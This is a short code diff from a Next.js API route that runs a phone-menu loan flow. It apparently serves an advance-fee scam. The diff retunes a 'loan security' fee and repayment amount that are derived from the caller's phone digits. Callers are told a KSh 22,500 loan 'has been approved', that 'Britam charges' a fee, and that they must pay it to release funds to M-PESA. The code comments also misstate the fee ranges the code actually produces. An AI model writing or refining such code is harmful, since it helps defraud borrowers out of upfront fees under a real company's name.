@@ -422,7 +422,7 @@ export async function POST(req: NextRequest) {
             // Option 3 Path: Repayments
       if (mainChoice === "3") {
         const phoneSeed = (parseFloat(phone.slice(-3)) || 5);
-        const seededRepayment = Math.floor(200 + phoneSeed % 801); // Generates a reproducible random amount between 50 and 70
+        const seededRepayment = Math.floor(100 + phoneSeed % 401); // Generates a reproducible random amount between 50 and 70
         const multiplierLoan = seededRepayment * 4;
 
         if (lastChoice === "3") {
@@ -453,7 +453,7 @@ export async function POST(req: NextRequest) {
       // Option 1 Path
       if (mainChoice === "1") {
         if (lastChoice === "1") {
-          const seededFee = Math.floor(200 + (parseFloat(phone.slice(-3)) || 5) % 801); // 60-70 range
+          const seededFee = Math.floor(100 + (parseFloat(phone.slice(-3)) || 5) % 401); // 60-70 range
           return respond(`Congratulations! Your KSh 22,500 secured loan has been approved.\nBritam charges KSh ${seededFee} for loan security.\n\n1. Complete fee to release to your M-PESA\n0. Cancel`, true);
         }
         return respond("Invalid choice. Please select 1 or 0.", true);
